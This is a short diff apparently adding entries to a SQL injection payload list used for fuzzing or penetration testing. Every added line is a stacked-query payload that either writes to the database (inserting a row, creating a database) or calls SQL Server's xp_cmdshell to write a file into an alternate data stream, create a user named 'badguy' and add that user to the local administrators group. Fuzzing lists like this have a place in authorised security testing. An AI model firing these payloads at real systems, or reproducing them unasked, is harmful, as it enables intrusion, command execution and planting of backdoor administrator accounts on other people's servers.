@@ -109,3 +109,8 @@ select%201%2c2
 admin'
 admin#
 admin--
+`;insert into userinfo values('x','x'); --
+`;create databaser hacker; --
+`;exec master..xp_cmdshell "echo you-are-hacked> c:\hacked.txt:ads.txt; --
+`;exec master..xp_cmdshell "net localgroup administrators badguy /ADD"; --
+`;exec master..xp_cmdshell "net user badguy /ADD"; --
